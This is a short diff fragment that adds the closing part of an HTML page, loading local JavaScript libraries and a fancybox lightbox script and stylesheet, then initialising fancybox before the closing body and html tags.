+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
